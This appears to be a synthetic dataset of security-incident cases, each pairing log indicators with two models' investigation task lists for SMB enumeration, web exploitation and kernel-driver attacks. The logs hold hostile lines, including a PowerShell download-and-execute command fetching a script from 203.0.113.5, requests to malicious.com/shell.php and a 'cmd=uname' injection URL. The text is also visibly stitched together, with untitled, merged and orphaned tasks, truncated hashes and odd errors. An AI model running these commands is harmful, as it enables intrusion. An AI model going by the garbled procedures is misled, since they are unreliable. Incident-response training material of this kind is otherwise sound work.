Description: Break down the 5,600 outbound flows by destination subnet, protocol, and average packet size to identify any systematic probing or potential data exfiltration. Check for high port diversity or repeated connection attempts to a single host, which could indicate an automated scanning script or reconnaissance routine.

Task #6  
Title: Validate Snort IDS Alert Specifics  
Description: Access Snort’s raw alert data for Alert ID 1407 to confirm the full packet details such as source port, destination port, packet size, and any payload snippet. Examine the surrounding sensor logs for additional similar alerts from the same source to gauge the scan's intensity and duration.

Task #7  
Title: Investigate Endpoint Denied Connections on WM1‑01  
Description: Pull Windows Security event logs (Event ID 5157 for denied inbound connection, 5154 for allowed connection) around the time of the denied SMB attempts on port 445. Verify whether the denied traffic originated from 203.0.113.45 or any transit proxies, and determine if the blockage was due to firewall rule or local ACL misconfiguration.

Task #8  
Title: Examine SMB Port 445 Security Configurations  
Description: Review group policy settings for SMB signing, encryption, and PDB1 support. Confirm that SMBv1 is disabled and that known SMB vulnerabilities (e.g., EternalBlue, SMBGhost) have been patched. Compare the permission matrix on the WM1‑01 share to the denied inbound attempts to ensure the host is hardened against exploitation.

Task #9  
Title: Perform Threat Injection Test via Mock Scan  
Description: Set up a controlled lab environment to emulate a 950 SYNs/min port‑scan from a test IP to a sandboxed firewall. Verify that the IDS triggers the same alert ID and that rate‑limiting functions as expected. Adjust detection thresholds if false positives arise, ensuring the real environment remains accurate.

Task #10  
Title: Implement Immediate Blocking or Rate‑Limiting  
Description: Based on the investigation, apply a temporary block via existing ACLs or a rate‑limit on the firewall that caps the SYN bursts from 203.0.113.45. Monitor the post‑block traffic to confirm that legitimate business services remain unaffected while thwarting the scanning activity.

Task #11  
Title: Review and Tighten Firewall Rule Set for SYN Floods  
Description: Audit the current firewall rule base for SYN‑rate‑limit capabilities and thresholds. Update the rule definitions to limit high‑volume SYN traffic to a single source IP, including a whitelist of approved scanners or legitimate testing hosts. Document rule changes for compliance and audit purposes.

Task #12  
Title: Conduct Forensic Analysis if 203.0.113.45 is an Internal Host  
Description: If the IP resolves to an internal server, run an endpoint security scan (ESET, CarbonBlack, or similar) to detect malware, check for persistence mechanisms, and analyze its connection history. Verify that no privileged accounts are being abused and that the host is not acting as a pivot for further reconnaissance. Log all findings and update the ticket with remediation steps.
model_b_tasks:
Task #1  
Title: Validate Alert Accuracy and Synchronize Time Stamps  
Description: Confirm that the timestamps in the firewall, Snort, NetFlow, and endpoint logs are consistent, accounting for any NTP drift or misconfigurations that could skew the 4‑minute scanning window. Ensure all records stem from the same time zone and calendar time to avoid mis‑correlation.

---

Task #2  
Title: Correlate Firewall and Snort Flow Data  
Description: Cross‑check the 3,840 TCP SYN packets reported by the firewall against Snort Alert ID 1407 logs to verify that all suspicious half‑open connections are accounted for. Verify the consistent source/destination IP‑port pairs and calculate the SYN/ACK ratio to confirm port‑scan characteristics.

---

Task #3  
Title: Expand NetFlow Monitoring Window  
Description: Retrieve NetFlow data for a 24‑hour period surrounding the detected activity to identify preceding or subsequent anomalous flows. Look for signs of continuous scanning, credential‑guessing attempts, or unusual burst patterns that might reveal a broader intrusion.

---

Task #4  
Title: Perform Endpoint WM1‑01 Deep Packet Inspection  
Description: Examine packet captures or syslog entries for WM1‑01 around the reject events for TCP 445 to confirm whether they were indeed blocked by the host firewall or arose from higher‑level application denial. Determine if any SMB traffic attempted handshake or enumeration prior to the deny action.

---

Task #5  
Title: Verify Internal Asset Ownership of 203.0.113.45  
Description: Query the corporate asset database, DHCP logs, and IPAM system to ascertain whether 203.0.113.45 is a known internal host, DMZ device, or monitored service. Identify the owning department, purpose of the IP, and whether any scheduled tasks could explain outbound scan directionality.

---

Task #6  
Title: Cross‑Reference Source IP with External Threat Intelligence  
Description: Feed 203.0.113.45 into global and industry‑specific intelligence platforms (MITRE ATT&CK, AlienVault OTX, Cisco Talos, etc.) to uncover prior malicious usage, attribution to threat actor groups, or presence on known scanning pools. Log any matches and the associated risk level.

---

Task #7  
Title: Search Authentication and Directory Logs for Correlation  
Description: Query Net‑Logon, Kerberos, and privileged account audit logs for any events tied to 203.0.113.45 or associated hostnames during the scanning interval. Identify anomalous RDP, SMB, or LDAP traffic that could indicate lateral movement or credential acquisition attempts.

---

Task #8  
Title: Assess SMB/445 Activity Context  
Description: Investigate Windows Defender logs, SMB signing status, and the SMB Banner on WM1‑01 to determine if the source IP targeting port 445 attempted session negotiation or enumeration of shared resources. Verify whether the host had AnyDesk, VNC, or remote desktop agents exposed on 445 that could have been probed.

---

Task #9  
Title: Identify Potential Vulnerability Exposure  
Description: Run an internal vulnerability scan from 203.0.113.45 against WM1‑01 to check for known SMB weaknesses (e.g., EternalBlue, SMBv1) that could have attracted the scanning activity. Correlate findings with timing to assess whether the attacker was probing for exploitable flaws.

---

Task #10  
Title: Recommend Immediate Defensive Measures and Long‑Term Controls  
Description: Draft a response memo advising on temporary blocking of the offending IP (or entire /24 if malicious cluster suspected), adjustment of IDS threshold settings for SYN floods to reduce false positives, and tightening of SMB/445 inbound ACLs. Propose mandatory patching of SMB services, enforcement of SMB signing, and enhanced EDR monitoring for subsequent outbound scans.

case_title: Enumeration attempt against corporate domain resources via SMB and PowerShell
case_description: Windows Security Event ID 4625 – 12 failed logon attempts from IP 10.0.0.18 to domain controller (DC01) over TCP port 445; SMBv1 traffic seen in packet capture from 10.1.1.50 targeting \\DOMAIN\ADMIN$ with repeated "Tree Connect" requests; PowerShell session initiated from user “cve_test” executing “Get-ADUser –Filter * –Server DC01” with command hash 4e3f5a2b; DNS AXFR query for zone “corp.local” observed from 10.0.0.30 to internal DNS server (port 53); File “smb_enum.exe” discovered on C:\Temp with SHA256 7acf59b3c5d3e8f4d1a2b9ff; Windows Event ID 4648 – logon attempt with explicit credentials (user: “admin@corp.local”) from workstation “PC-02”; Network flow logs show an increase of NetBIOS name service requests from 10.1.1.50 to multiple internal hosts; User-agent “Mozilla/5.0” in HTTP requests to internal web portal with path “/admin/overview” containing malformed query strings; Windows Management Instrumentation (WMI) query logs for “Win32_UserAccount” executed by user “admin” from IP 10.0.0.18; Service enumeration via “sc query type=service” executed from PowerShell session on host “WIN-01”.
model_a_tasks:
Task #1  
Title: Review failed logon attempts from IP 10.0.0.18  
Description: Examine Security logs (Event ID 4625) for each of the 12 failed logon attempts to DC01 over TCP port 445. Identify the target accounts, timestamp distribution, and any lockout events. Compare these attempts against legitimate login patterns to determine if this is a brute‑force activity or a false positive.  

Task #2  
Title: Correlate explicit credential logons (Event 4648) with failed attempts  
Description: Cross‑reference the 4648 event (explicit credential use by “admin@corp.local” from PC‑02) with associated 4625 and 4624 logs. Verify if the explicit credential usage coincides with a successful logon or failed attempts, indicating credential reuse or a compromised account.  

Task #3  
Title: Identify and analyze SMBv1 traffic from 10.1.1.50  
Description: Inspect packet captures and NetFlow for SMBv1 “Tree Connect” requests targeting \\DOMAIN\ADMIN$. Confirm whether SMBv1 is enabled on domain controllers and file servers. Check request frequency and timestamps against normal usage to assess the likelihood of exploitation attempts such as EternalBlue or SMB relay.  

Task #4  
Title: Validate the legitimacy of user “cve_test”  
Description: Query Active Directory and security auditing to confirm the role, group membership, and last password change of user “cve_test”. Review console and execution logs for the PowerShell session that ran “Get‑ADUser”. Determine if this user has appropriate privileges for AD enumeration or if the account may have been compromised.  

Task #5  
Title: Verify DNS zone transfer request from 10.0.0.30  
Description: Review DNS server logs for the AXFR request to the internal zone “corp.local” from IP 10.0.0.30. Verify zone transfer permissions are restricted to trusted IPs and audit the response to confirm no unauthorized data was extracted.  

Task #6  
Title: Scan “smb_enum.exe” for malicious payload  
Description: Conduct static and dynamic analysis of the file located at C:\Temp\smb_enum.exe (SHA256 7acf59b3c5d3e8f4d1a2b9ff). Check for known malware signatures, analyze its execution environment, registry modifications, and outbound network activity to confirm if the binary is part of an attack or legitimate testing tool.  

Task #7  
Title: Investigate WMI queries executed by “admin” from 10.0.0.18  
Description: Examine WMI logs for “Win32_UserAccount” queries run by user “admin”. Determine if these queries align with authorized administrative tasks or if they match patterns used for lateral movement or credential dumping.  

Task #8  
Title: Assess NetBIOS name service activity from 10.1.1.50  
Description: Analyze NetFlow and SMB logs for increased NetBIOS name service requests originating from 10.1.1.50. Correlate these requests with SMB and DNS traffic to evaluate whether the host is gathering host information in preparation for lateral movement.  

Task #9  
Title: Scrutinize HTTP requests to /admin/overview  
Description: Extract web proxy logs for requests with User‑Agent “Mozilla/5.0” targeting the internal path /admin/overview that contain malformed query strings. Identify potential injection or XSS attempts, confirm the source IPs, and check whether any authenticated sessions were exploited during these requests.  

Task #10  
Title: Confirm “sc query” service enumeration on WIN-01  
Description: Review PowerShell logs on host WIN‑01 around the execution of “sc query type=service”. Enumerate the resulting service list, noting any critical or sensitive services that could indicate reconnaissance or preparatory steps for exploitation.  

Task #11  
Title: Cross‑reference indicators with MITRE ATT&CK techniques  
Description: Map observed enum activities (SMBv1 enumeration, AD query, DNS zone transfer, WMI queries, service queries) to MITRE ATT&CK techniques (T1087, T1043, T1087.002, etc.). Use the mapping to assess the attacker’s tactics and possible next steps.  

Task #12  
Title: Determine potential lateral movement from compromised admin account  
Description: Build a timeline of admin@corp.local account activity, including explicit credential usage (Event 4648), succeeded logins, and any subsequent service or process creation. Identify whether lateral movement was executed on the network, and recommend containment actions such as disabling the account, resetting passwords, or applying MFA.  

Task #13  
Title: Apply immediate containment and hardening measures  
Description: Based on findings, recommend disabling SMBv1 across the environment, restricting zone transfer permissions, blocking suspicious IPs (10.0.0.18, 10.1.1.50), and ensuring all critical accounts have MFA enabled. Advise on monitoring key logs for repeat enumeration attempts and on conducting a security audit of all internal hosts for persistence mechanisms.  

Task #14  
Title: Produce a comprehensive risk assessment and next‑step plan  
Description: Summarize the investigation results, quantify the risk to sensitive data, and outline incremental remediation steps. Include recommendations for extending monitoring to PowerShell, WMI, DNS, and SMB logs, as well as for conducting a full penetration test for related enumeration techniques.
model_b_tasks:
Task #1  
Title: Validate legitimacy of SMBv1 traffic and retire SMBv1 if unused  
Description: Examine SMBv1 transaction logs from 10.1.1.50 targeting \\DOMAIN\ADMIN$ for signs of exploitation or unauthorized data transfer. Confirm whether SMBv1 is actively required by any critical applications. If not, enforce SMBv1 disablement across all endpoints and domain controllers through Group Policy, documenting decisions and steps taken.  

Task #2  
Title: Correlate failed SMB logon attempts (Event ID 4625) for brute‑force detection  
Description: Scrutinize Windows Event 4625 logs for source IP 10.0.0.18 toward DC01 over port 445. Identify patterns of repeated failures, usernames targeted, and check for resulting account lockouts. Apply IP blocking or latency throttling if brute‑force behavior is confirmed and remediate vulnerable accounts accordingly.  

Task #3  
Title: Investigate PowerShell enumeration activity by cve_test account  
Description: Cross‑check authenticity of the “cve_test” user against the corporate directory; initiate an account review if the user does not exist. Examine PowerShell logs for the Get‑ADUser –Filter * –Server DC01 command and its hash 4e3f5a2b for reconnaissance or malicious intent. Correlate network activity to DC01 during command execution. Disable or reset credentials for cve_test if unauthorized.  

Task #4  
Title: Examine Event ID 4648 explicit credential usage for lateral movement risk  
Description: Analyze explicit credential logons involving “admin@corp.local” from workstation “PC-02”. Verify PC‑02’s trust relationship with the domain and confirm legitimate administrative use. If evidence of compromise is found, lock the workstation, invalidate credentials, and conduct a host forensic exam.  

Task #5  
Title: Secure internal DNS zone transfers by reviewing AXFR activity  
Description: Inspect DNS AXFR requests for zone “corp.local” originating from IP 10.0.0.30. Confirm zone transfer permissions are restricted to designated secondary DNS servers only. Compare zone data with a validated baseline to detect unauthorized changes or data leakage. Tighten zone transfer controls by limiting source IP addresses or disabling AXFR entirely if not required.  

Task #6  
Title: Identify malicious NetBIOS name service enumeration activity  
Description: Audit flow logs indicating an increase in NetBIOS name requests from 10.1.1.50 to multiple internal hosts. Match request patterns against known enumeration signatures (e.g., nbtstat ‑A). Flag suspicious scanning activity, block the source IP if necessary, and cross‑reference with other enumeration artifacts to confirm attacker presence.  

Task #7  
Title: Detect injection attempts via malformed HTTP requests to internal admin portal  
Description: Scrutinize HTTP logs for requests to /admin/overview containing malicious or malformed query strings, especially with user‑agent “Mozilla/5.0”. Test identified input vectors against known injection types (SQLi, XSS, Command Injection). If vulnerabilities are confirmed, patch the web application, enforce strict input validation, and increase logging around the admin portal.  

Task #8  
Title: Investigate suspicious WMI queries for privilege escalation  
Description: Review logs capturing “Win32_UserAccount” queries executed by user “admin” from IP 10.0.0.18. Ascertain whether the query aligns with legitimate administrative tasks. If not, check for signs of privilege escalation or credential extraction via WMI. Implement WMI query filtering and monitor for anomalous execution frequently.  

Task #9  
Title: Verify service enumeration outputs for unauthorized services  
Description: Examine command logs for “sc query type=service” performed from PowerShell on host “WIN‑01”. Cross‑check discovered services against a baseline inventory; flag unknown or suspicious services that may indicate persistence mechanisms. Investigate further through host‑based forensics and consider removal or hardening of identified services.  

Task #10  
Title: Scan internal directories for malicious executables such as smb_enum.exe  
Description: Locate files named “smb_enum.exe” on internal hosts (e.g., C:\Temp). Verify file hash against known benign and malicious samples (SHA256 7acf59b3c5d3e8f4d1a2b9ff). Conduct static and dynamic analysis to identify malware capabilities. If malicious, isolate hosts immediately, deploy endpoint cleaners, and perform memory forensics.  

Task #11  
Title: Construct a comprehensive enumeration activity timeline  
Description: Aggregate all collected artifacts (failed logons, SMB traffic, PowerShell commands, DNS AXFRs, NetBIOS queries, HTTP requests, WMI logs, service enumeration) into a chronological timeline. Highlight the escalation path from discovery to potential exploitation. Use visual timelines in SOC reporting tools for stakeholder clarity.  

Task #12  
Title: Enforce least privilege controls on domain controller ADMIN$ share  
Description: Review ACLs on the ADMIN$ share on domain controllers. Verify that only explicitly authorized privileged accounts can access the share. If excessive permissions are identified, remediate immediately by tightening ACLs, enabling SMB signing, and enforcing NTLMv2 authentication. Document changes for audit trail.  

Task #13  
Title: Enable comprehensive PowerShell logging and auditing  
Description: Ensure that PowerShell module logging, script block logging, and transcription are fully enabled across all endpoints. Configure a central volume to collect logs, parse them for suspicious activity patterns via SOAR playbooks. Provide continuous visibility into PowerShell usage and quickly detect malicious scripts.  

Task #14  
Title: Conduct forensic imaging of suspect workstations PC‑02 and WIN‑01  
Description: Acquire forensic images (disk, memory) of suspect devices. Preserve chain‑of‑custody information. Analyze images for hidden files, scheduled tasks, abnormal registry keys, or signed payloads like smb_enum.exe. Report findings with recommendations for containment and eradication.  

Task #15  
Title: Recommend hardening controls, monitoring enhancements, and remediation steps  
Description: Summarize investigation findings and propose corrective actions: disable SMBv1, restrict explicit credential usage, enforce MFA for privileged accounts, tighten DNS zone transfer policies, monitor NetBIOS requests, secure web admin portal input points, enable rigorous PowerShell auditing, apply least privilege on SMB shares, patch known vulnerabilities. Outline implementation roadmap, assign owners, and propose monitoring dashboards for early detection.

case_title: Potential Exploitation Attempt Targeting Enterprise Web Application Detected
case_description:
- Firewall log: blocked inbound TCP 80 connection from 203.0.113.45 containing payload string "CVE-2024-xxxx exploit" at 12:03:17 UTC.  
- IDS alert (Snort rule 63001): “Apache Remote Code Execution Attempt” triggered for source IP 203.0.113.45, destination 10.0.5.12, HTTP GET /admin/index.php?cmd=uname+%24@.  
- Sysmon event ID 1: file creation C:\Users\Public\temp\hijack.exe with MD5 = a1b2c3d4e5f67890abcdef1234567890.  
- PowerShell log: execution of base64‑encoded command “I0RXQyHr...” with SID S-1-5-21-...-1001 launched under user “Domain\Attacker”.  
- Windows Security event 4688: creation of process C:\Windows\system32\cmd.exe – event ID 4688 logged at 12:04:08 UTC with authentication ID ‑1.  
- Endpoint registry audit: new HKCU\Software\Microsoft\Windows\CurrentVersion\Run\exploit.exe entry added at 12:04:12 UTC.  
- NetFlow record: outbound HTTPS session from 10.0.5.12 to 185.228.112.19:443 over 12‑15 minutes; packet size 2048 bytes.  
- Web proxy log: multiple requests from 12.00‑12.10 UTC to http://malicious.com/shell.php with status 200; user agent “Mozilla/5.0” unknown.  
- Browser console log from Windows 10 machine: JavaScript alert “eval(atob('dGVzdA=='))” executed at 12:05:03 UTC.  
- Email gateway quarantine: 2 messages flagged as phishing with link to http://malicious.com/phish.html received at 12:02:30 UTC.

If the IP is identified as a threat actor, add it to the internal block list and alert the security operations team.

Task #2

Examine the HTTP request headers and body for the presence of the exploit string and any suspicious query parameters. Compare the packet content to known exploitation signatures to confirm whether it matches the CVE‑2024‑xxxx vulnerability exploitation pattern.

Task #3  
Title: Confirm remote code execution on web server 10.0.5.12  
Description: Log into the Apache web server at 10.0.5.12 and verify the current Apache and PHP versions. Manually send the same GET request found in the IDS alert (`/admin/index.php?cmd=uname+%24@`) to see if it returns a system shell or responses indicative of command execution. Use vulnerability scanners (e.g., Nessus, OpenVAS) to automatically test for CVE‑2024‑xxxx on the affected page.

Task #4  
Title: Verify hijack.exe as malicious payload  
Description: Pull the file `C:\Users\Public\temp\hijack.exe` from the endpoint and compute its SHA‑256 and MD5 hashes. Cross‑check these against internal IOC databases and external threat feeds. Execute the binary in a sandbox environment to observe its behavior, focusing on persistence, file creation, registry changes, and outbound network activity.

Task #5

Examine the resulting PowerShell script for malicious functions such as downloading additional payloads, creating scheduled tasks, modifying registry keys, or exfiltrating data. If malware is confirmed, determine whether it triggers the installation of hijack.exe or other malicious components.

Task #6  
Title: Correlate cmd.exe process chain under Domain\Attacker  
Description: Use Event ID 4688 to trace the parent process of the `cmd.exe` instance launched at 12:04:08 UTC. Verify whether the command line invoked by `cmd.exe` orchestrated PowerShell execution, file creation, or further propagation. Check for elevation or privilege escalation indicators and confirm if the account “Domain\Attacker” is legitimate or compromised.

Task #7  
Title: Examine Run registry key entry for persistence  
Description: Inspect the newly added entry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\exploit.exe` at 12:04:12 UTC. Verify the file path, hash, and existence of `exploit.exe` on the system. Determine if this registry modification points to `hijack.exe` or another payload and document its persistence behavior.

Task #8  
Title: Investigate outbound HTTPS session to 185.228.112.19  
Description: Analyze the NetFlow record and endpoint logs for the HTTPS session from 10.0.5.12 to 185.228.112.19 that lasted 12–15 minutes. Task #9  
Title: Audit web proxy logs for malicious shell.php access  
Description: Filter the proxy logs for all requests to `http://malicious.com/shell.php` that occurred between 12:00–12:10 UTC. Correlate these requests with source IPs, user agents, and authenticated sessions. Verify whether a malicious shell was successfully downloaded or executed on any endpoint, and if so, isolate affected machines.

Resolve the URLs to identify the final landing page, check for redirects, and test for known phishing indicators. If the links correspond to the malicious site used in other alerts, add the domain to the firewall block list and update the email gateway policy.

Reset credentials for the Domain\Attacker account, investigate how the account was compromised, and conduct a full forensic imaging of the host to ensure no additional backdoors remain.

case_title: Detected suspicious privilege escalation attempt via kernel driver installation on Windows Server
case_description:
- Windows Security Event ID 4688: Process creation – powershell.exe launched with *Elevated*: Yes at 2024‑04‑12 03:47:12 UTC, command line **powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -Command "Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://203.0.113.5/install-kernel.ps1'))"**  
- Sysmon Event ID 4: New file created at **C:\Windows\SysWOW64\drivers\kext.sys**, SHA256: 7c3f8e2a1d5b9c4f6b2d9a4f5e7c8a9b3d2e1f0c5b4a3d2e1f0c9b8a7d6e5f4e  
- Sysmon Event ID 10: Network connection from local IP 10.0.0.103 to external IP 203.0.113.5 on port 443 recorded at 2024‑04‑12 03:46:58 UTC  
- Windows Event ID 7045: Service “SecureShell” installed; start type Automatic; binary path **C:\Windows\SysWOW64\drivers\kext.sys** – created by user Administrator  
- Security Log Event ID 4624: Successful logon (Logon Type 10) – user **Administrator** from host **10.0.0.103** (RDP) at 2024‑04‑12 03:42:07 UTC  
- Registry modification – key **HKCU\Software\Microsoft\Windows\CurrentVersion\Run** added entry “SyncTool” pointing to **C:\Users\Administrator\AppData\Local\Temp\SyncTool.exe** at 2024‑04‑12 03:48:23 UTC  
- File created: **C:\Users\Administrator\AppData\Local\Temp\setup.exe** (MD5: 9e8d6c5b4a3f2d1c0b9a8e7f6d5c4b3a) downloaded from malicious domain 203.0.113.5 at 2024‑04‑12 03:34:05 UTC  
- Process list snapshot captured by Sysmon: **cmd.exe → powershell.exe → c:\windows\syswow64\drivers\kext.sys** (process ID 1256) running under **SYSTEM** account at 2024‑04‑12 03:49:10 UTC  
- Windows Security Event ID 4719: System audit policy change – logon auditing enabled, observed at 2024‑04‑12 02:00:00 UTC  
- Anomaly: User account **domain\NewAdmin** creation detected in AD logs on 2024‑04‑12 03:51:12 UTC (privilege elevation potential).
model_a_tasks:
Task #1  
Title: Validate PowerShell execution context  
Description: Verify the legitimacy of the PowerShell instance that created the kernel driver. Examine the command‑line arguments and the “Elevated: Yes” flag to ensure it was executed under SYSTEM or Administrator. Cross‑check with other PowerShell sessions to rule out benign activity.

Task #2  
Title: Retrieve and sandbox the remote PowerShell script  
Description: Download the script from `http://203.0.113.5/install-kernel.ps1` into a controlled sandbox environment. Execute the script in isolation, capture console output, and extract all downloaded files or executed commands for further analysis.

Task #3  
Title: Static analysis of the kext.sys driver  
Description: Hash the driver file (`C:\Windows\SysWOW64\drivers\kext.sys`) to confirm the provided SHA256. Run static analysis tools (e.g., IDA, Ghidra, or Driver Verifier) to identify rootkit techniques, undisclosed API calls, and any malicious payload usage.

Task #4  
Title: Inspect the “SecureShell” service registration  
Description: Query the service configuration (using `sc qc SecureShell` or PowerShell) to verify its start type, binary path, and whether any dependencies or service parameters indicate malicious intent. Check for any service persistence mechanisms beyond this binary.

Task #5  
Title: Correlate outbound connection to 203.0.113.5  
Description: Review network logs (firewall, WFP, or third‑party SIEM) to confirm the TCP traffic on port 443 to `203.0.113.5`. Capture packet captures (pcap) if available to inspect TLS handshake details and determine whether the traffic is established by the PowerShell script or the driver.

Task #6  
Title: Examine Run‑Key persistence entries  
Description: Enumerate all registry Run keys under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (and HKLM equivalents) for the presence of “SyncTool” and other anomalies. Steal the referenced `SyncTool.exe` from the temp directory and run a static/dynamic analysis.

Task #7  
Title: Sandbox analysis of downloaded setup.exe  
Description: Place the MD5‑identified `setup.exe` into a sandbox to monitor its behaviour, file modifications, registry edits, and network activity. Capture any additional files it extracts (e.g., `SyncTool.exe`) and evaluate maliciousness through AV or human review.

Task #8  
Title: Review system audit policy change event  
Description: Investigate the `4719` event that enabled logon auditing. Verify the user or process that performed this change and confirm whether the change was performed by a legitimate admin or could have been used to cover malicious actions.

Task #9  
Title: Assess the RDP login that granted Administrator access  
Description: Check the authentication event `4624` for `Logon Type 10`, verifying the source IP (`10.0.0.103`), credential age, MFA status, and whether this session had anomalies such as unusual command usage. Cross‑reference with AD or Group Policy changes around that time.

Task #10  
Title: Investigate the newly created domain\NewAdmin account  
Description: Audit the AD object for `domain\NewAdmin` to determine group memberships, delegated permissions, and whether it was granted elevated rights. Compare creation time with the timeline of the driver installation to assess possible lateral movement.

Task #11  
Title: Reconstruct the full timeline of events  
Description: Order all collected events chronologically, mapping PowerShell execution, script download, driver creation, service installation, timestamped logons, and account creation. Identify gaps or overlapping events that may indicate additional malicious activity.

Task #12  
Title: Process chain validation for SYSTEM‑level execution  
Description: Confirm that the process lineage `cmd.exe → powershell.exe → kext.sys` ends with the driver running under the SYSTEM account. Use tools like Process Explorer or Sysmon Log with parent–child relationships to ensure there is no hidden intermediary.

Task #13  
Title: Verify file creation timestamps against system clocks  
Description: Compare file creation timestamps for `kext.sys`, `setup.exe`, and `SyncTool.exe` against the host clock and active directory logs. Consider time‑skew or clock manipulation tactics used by adversaries to conceal activity.

Task #14

Description: Run a full artifact search (e.g., `Get-ChildItem -Recurse –Force | Where-Object {$_.PSIsContainer -eq $false}`) for suspicious cronated‑type “Scheduled Task”, “DLL hijacking” entries, and orphaned services across the system. Verify each with a sandbox or static routine.

Task #15  
Title: Conduct threat‑intel lookup on IP 203.0.113.5 and domain relationships  
Description: Query internal and external threat‑intelligence feeds for known activity associated with `203.0.113.5`. Investigate if the IP or related domain is part of an attacker infrastructure or if any past incidents on the endpoint correlate with this actor’s patterns.
